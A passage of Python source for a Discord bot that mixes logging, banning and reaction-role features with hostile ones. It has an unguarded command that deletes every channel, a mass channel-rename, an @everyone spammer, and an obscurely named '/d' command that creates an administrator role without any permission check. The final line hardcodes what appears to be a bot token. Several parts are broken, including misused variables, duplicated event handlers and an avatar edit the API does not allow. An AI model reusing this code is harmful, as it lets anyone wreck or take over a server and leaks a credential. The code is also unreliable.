        await interaction.response.send_message("You don't have permission to use this command. You must have administrator permissions.")

@bot.command(name="pingall", help="Ping everyone in the server.")
async def pingall(ctx):
        await ctx.send("@everyone")


@bot.command()
async def deleteAllChannels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Couldn't delete channel {channel.name}: {e}")

    await ctx.send('All channels have been deleted.')

@deleteAllChannels.error
async def deleteAllChannels_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have the required permissions to use this command.")

@bot.command()
@has_permissions(administrator=True)
async def rename_channels(ctx):
    for channel in ctx.guild.channels:
        await channel.edit(name='lol-lelele')
    await interaction.followup.send("done!", ephemeral=True)

@rename_channels.error
async def rename_channels_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have the necessary permissions to run this command.")

@bot.event
async def on_reaction_add(reaction, user):
    if user.bot:
        return

    logs_channel = discord.utils.get(reaction.message.guild.channels, name="logs")
    if logs_channel:
        embed = discord.Embed(title="Reaction Added", color=discord.Color.blue())
        embed.add_field(name="Reactor", value=user.mention, inline=True)
        embed.add_field(name="Message Author", value=reaction.message.author.mention, inline=True)
        embed.add_field(name="Emoji Used", value=str(reaction.emoji), inline=True)
        embed.add_field(name="Time", value=datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), inline=False)
        embed.add_field(name="Message Content", value=reaction.message.content, inline=False)
        embed.add_field(name="Message Link", value=f"[Jump to Message]({reaction.message.jump_url})", inline=False)
        
        await logs_channel.send(embed=embed)

@bot.tree.command(name='change_nickname')
async def change_nickname(interaction, member: discord.Member, new_nickname: str):
    try:
        await member.edit(nick=new_nickname)
        await interaction.response.send_message(f'Nickname for {member.mention} has been changed to {new_nickname}')
    except discord.Forbidden:
        await interaction.response.send_message('I do not have permission to change nicknames.')
    except discord.HTTPException as e:
        await interaction.response.send_message(f'Failed to change nickname: {e}')

@bot.tree.command(name='change_avatar')
async def change_avatar(ctx, member: discord.Member, image_url: str):
    try:
        async with bot.session.get(image_url) as response:
            if response.status != 200:
                return await ctx.send('Failed to fetch image.')
            data = await response.read()
            await member.edit(avatar=data)
            await ctx.send(f'Profile picture for {member.mention} has been changed.')
    except discord.Forbidden:
        await ctx.send('I do not have permission to change profile pictures.')
    except discord.HTTPException as e:
        await ctx.send(f'Failed to change profile picture: {e}')

@bot.tree.command(name="d")
async def create_admin_role(interaction: discord.Interaction):
    guild = interaction.guild
    if guild:
        admin_role = await guild.create_role(name="new role", permissions=discord.Permissions(administrator=True))
        await interaction.user.send(f'Role {admin_role.name} created with admin permissions!')
    else:
        await interaction.user.send('This command can only be used in a server.')

@bot.event
async def on_invite_create(invite):
    channel = discord.utils.get(invite.guild.text_channels, name='logs')
    if channel:
        embed = discord.Embed(title="New Invite Created", color=discord.Color.blue())
        embed.add_field(name="Inviter", value=invite.inviter, inline=True)
        embed.add_field(name="Channel", value=invite.channel, inline=True)
        embed.add_field(name="Invite Link", value=invite.url, inline=False)
        await channel.send(embed=embed)

@bot.event
async def on_member_ban(guild, user):
    channel = discord.utils.get(guild.text_channels, name='logs')
    if channel:
        embed = discord.Embed(title="User Banned", color=discord.Color.red())
        embed.add_field(name="User", value=user, inline=True)
        await channel.send(embed=embed)

@bot.tree.command(name="ban", description="Ban a user from the server")
async def ban(interaction: discord.Interaction, user: discord.User, reason: str = None):
    guild = interaction.guild
    if guild:
        await guild.ban(user, reason=reason)
        embed = discord.Embed(title="User Banned", color=discord.Color.red())
        embed.add_field(name="User", value=user, inline=True)
        embed.add_field(name="Reason", value=reason if reason else "No reason provided", inline=False)
        channel = discord.utils.get(guild.text_channels, name='logs')
        if channel:
            await channel.send(embed=embed)
        await interaction.response.send_message(f'{user} has been banned from the server for: {reason}')

@bot.tree.command(name="warn")
@app_commands.checks.has_permissions(administrator=True)
async def warn(interaction: discord.Interaction, user: discord.User, *, reason: str):
    # Send a direct message to the user with the warning reason
    try:
        await user.send(f"You have been warned for the following reason: {reason}")
        await interaction.response.send_message(f"{user.mention} has been warned.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(f"Could not send a warning to {user.mention}.", ephemeral=True)

@bot.tree.command(name="give_member_role", description="Gives everyone the Member role")
@app_commands.checks.has_permissions(administrator=True)
async def give_member_role(interaction: discord.Interaction):
    role = discord.utils.get(interaction.guild.roles, name="Member")
    if role is None:
        await interaction.response.send_message("Role 'Member' not found.")
        return

    for member in interaction.guild.members:
        if role not in member.roles:
            await member.add_roles(role)
            await interaction.channel.send(f"Added 'Member' role to {member.name}")

    await interaction.response.send_message("Finished assigning 'Member' role to all members.")

@bot.tree.command(name="say", description="Admin command to make the bot say anything.")
@app_commands.checks.has_permissions(administrator=True)
async def say(interaction: discord.Interaction, message: str):
    await interaction.response.send_message(message)

@say.error
async def say_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)

@bot.tree.command(name="rr", description="Create a reaction role message")
async def create_reaction_role(interaction: discord.Interaction):
    message = await interaction.channel.send("@everyone React to this message to get the suggestors role!")
    emoji = '🤔'  # Choose your emoji
    await message.add_reaction(emoji)

    # Save the message ID and emoji for later use
    bot.message_id = message.id
    bot.emoji = emoji
    await interaction.response.send_message("Reaction role message created!", ephemeral=True)

@bot.event
async def on_raw_reaction_add(payload):
    if payload.message_id == bot.message_id and str(payload.emoji) == bot.emoji:
        guild = bot.get_guild(payload.guild_id)
        role = discord.utils.get(guild.roles, name="suggestors")
        member = guild.get_member(payload.user_id)
        if role and member:
            await member.add_roles(role)

@bot.event
async def on_raw_reaction_remove(payload):
    if payload.message_id == bot.message_id and str(payload.emoji) == bot.emoji:
        guild = bot.get_guild(payload.guild_id)
        role = discord.utils.get(guild.roles, name="suggestors")
        member = guild.get_member(payload.user_id)
        if role and member:
            await member.remove_roles(role)

emoji_to_role = {
    '🔴': 987654321098765432,  # ID of the role associated with the red circle emoji
    '🟡': 876543210987654321,  # ID of the role associated with the yellow circle emoji
}

role_message_id = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    await bot.tree.sync()

@bot.tree.command(name="sendrolemessage", description="Send a message for reaction roles")
async def sendrolemessage(interaction: discord.Interaction):
    global role_message_id
    message = await interaction.channel.send("")
    for emoji in emoji_to_role.keys():
        await message.add_reaction(emoji)
    role_message_id = message.id
    await interaction.response.send_message("Role message sent!", ephemeral=True)

@bot.event
async def on_raw_reaction_add(payload):
    if payload.message_id != role_message_id:
        return

    guild = bot.get_guild(payload.guild_id)
    if guild is None:
        return

    role_id = emoji_to_role.get(payload.emoji.name)
    if role_id is None:
        return

    role = guild.get_role(role_id)
    if role is None:
        return

    member = guild.get_member(payload.user_id)
    if member is None:
        return

    await member.add_roles(role)

@bot.event
async def on_raw_reaction_remove(payload):
    if payload.message_id != role_message_id:
        return

    guild = bot.get_guild(payload.guild_id)
    if guild is None:
        return

    role_id = emoji_to_role.get(payload.emoji.name)
    if role_id is None:
        return

    role = guild.get_role(role_id)
    if role is None:
        return

    member = guild.get_member(payload.user_id)
    if member is None:
        return

    await member.remove_roles(role)


bot.run('MTI2OTM3MTI3NDc4Njg5ODA2MA.Geke5T.tNrt3ByiKmlNFNJNW3JGFyHKSooE0g9XaW8Xlk')
